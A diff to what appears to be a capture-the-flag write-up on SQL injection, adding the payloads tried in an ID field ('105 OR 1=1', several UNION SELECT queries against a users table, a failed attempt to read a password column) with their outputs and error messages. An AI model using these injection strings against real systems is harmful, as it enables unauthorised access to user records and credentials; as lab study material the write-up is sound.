@@ -31,16 +31,48 @@ I put
 ```
 105 OR 1=1
 ```
-```
-SELECT first_name, sur_name, id FROM Users WHERE ID = 105 OR 1=1
-```
-
 And I got all users.
 ```
 ID: 105 OR 1=1 
 First name: Flag
 Surname : GetThe
 ```
+We are guessing sql will look like this.
+```
+SELECT first_name, last_name FROM Users WHERE ID = 105 OR 1=1
+```
+
+```
+1 UNION SELECT * FROM users --
+->
+The used SELECT statements have a different number of columns
+```
+```
+1 UNION SELECT first_name, last_name FROM users --
+->
+ID: 1 UNION SELECT first_name, last_name FROM users -- 
+First name: one
+Surname : me
+
+ID: 1 UNION SELECT first_name, last_name FROM users -- 
+First name: two
+Surname : me
+
+ID: 1 UNION SELECT first_name, last_name FROM users -- 
+First name: three
+Surname : me
+
+ID: 1 UNION SELECT first_name, last_name FROM users -- 
+First name: Flag
+Surname : GetThe
+```
+
+```
+1 UNION SELECT password, last_name FROM users
+->
+Unknown column 'password' in 'field list'
+```
+
 But I don't know what to do with it.
 
 ### 03 SQL injection from image search
